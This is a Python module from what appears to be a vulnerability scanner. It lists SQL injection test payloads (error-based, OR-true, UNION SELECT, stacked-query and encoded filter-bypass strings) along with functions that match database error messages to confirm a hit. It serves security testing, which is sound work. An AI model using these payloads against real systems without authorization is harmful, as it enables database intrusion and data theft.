"""
scanner/payloads/sqli.py

SQL Injection payloads for vulnerability testing.
Includes: Error-based, Boolean-based, Union-based tests
"""

from .base import Payload


def sqli_error_confirm(response_text: str) -> bool:
    """
    Check for SQL error messages in response.
    Comprehensive list covering multiple database types.
    """
    errors = [
        # MySQL
        "sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "mysql_query",
        "mysqli_",
        "you have an error in your sql syntax",
        "supplied argument is not a valid mysql",
        "mysql server version",
        
        # PostgreSQL
        "pg_query",
        "pg_exec",
        "postgresql",
        "psql:",
        "invalid input syntax for",
        "unterminated quoted string",
        
        # SQLite
        "sqlite_",
        "sqlite3::",
        "sqlite error",
        "unrecognized token",
        "unable to open database",
        
        # Microsoft SQL Server
        "mssql_",
        "odbc sql server driver",
        "microsoft ole db provider for sql server",
        "unclosed quotation mark",
        "incorrect syntax near",
        "sql server",
        
        # Oracle
        "ora-01756",
        "ora-00933",
        "ora-00936",
        "ora-00942",
        "oracle error",
        "quoted string not properly terminated",
        "invalid sql statement",
        
        # Generic
        "syntax error",
        "query failed",
        "database error",
        "sql error",
        "warning: ",
        "fatal error:",
        "invalid query",
        "unexpected end of sql",
    ]
    
    text_lower = response_text.lower()
    return any(e.lower() in text_lower for e in errors)


def sqli_boolean_confirm(response_text: str) -> bool:
    """
    Check for boolean-based SQLi indicators.
    Look for typical true/false response patterns.
    """
    # This is tricky - mainly used in conjunction with baseline comparison
    # Return False here; the VulnerabilityTester handles length comparison
    return False


def sqli_union_confirm(response_text: str) -> bool:
    """Check for UNION-based SQLi success indicators."""
    indicators = [
        # Common column names that might leak
        "username", "password", "email", "user_id",
        "admin", "root", "information_schema",
        # Version strings
        "mysql", "postgresql", "sqlite", "microsoft sql server",
    ]
    text_lower = response_text.lower()
    # Only confirm if we see unusual database info
    for ind in ["information_schema", "mysql.user", "sqlite_master"]:
        if ind in text_lower:
            return True
    return False


SQLI_PAYLOADS = [
    # ============================================
    # ERROR-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Single quote",
        payload="'",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Double quote",
        payload='"',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Backslash",
        payload="\\",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Comment injection",
        payload="1'--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Comment with space",
        payload="1' -- -",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    
    # ============================================
    # BOOLEAN-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="OR true (single quote)",
        payload="' OR '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true (double quote)",
        payload='" OR "1"="1',
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="OR true (no quotes)",
        payload="1 OR 1=1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="AND true",
        payload="1' AND '1'='1",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="AND false",
        payload="1' AND '1'='2",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_boolean_confirm
    ),
    
    # ============================================
    # UNION-BASED SQLi
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT NULL",
        payload="' UNION SELECT NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION SELECT multiple",
        payload="' UNION SELECT NULL,NULL,NULL--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="UNION with version",
        payload="' UNION SELECT @@version--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_union_confirm
    ),
    
    # ============================================
    # STACKED QUERIES (Dangerous - safe=True because we're not executing)
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="Stacked query test",
        payload="'; SELECT 1--",
        contexts=["url", "form"],
        severity="Critical",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    
    # ============================================
    # ENCODED VARIANTS (Filter Bypass)
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="URL encoded quote",
        payload="%27",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="Hex encoded OR",
        payload="1' %4F%52 '1'='1",
        contexts=["url"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    
    # ============================================
    # DATABASE SPECIFIC
    # ============================================
    Payload(
        vuln_type="SQLi",
        name="MySQL comment",
        payload="1'/**/OR/**/1=1/**/--",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
    Payload(
        vuln_type="SQLi",
        name="PostgreSQL casting",
        payload="1'::int",
        contexts=["url", "form"],
        severity="High",
        safe=True,
        confirmation=sqli_error_confirm
    ),
]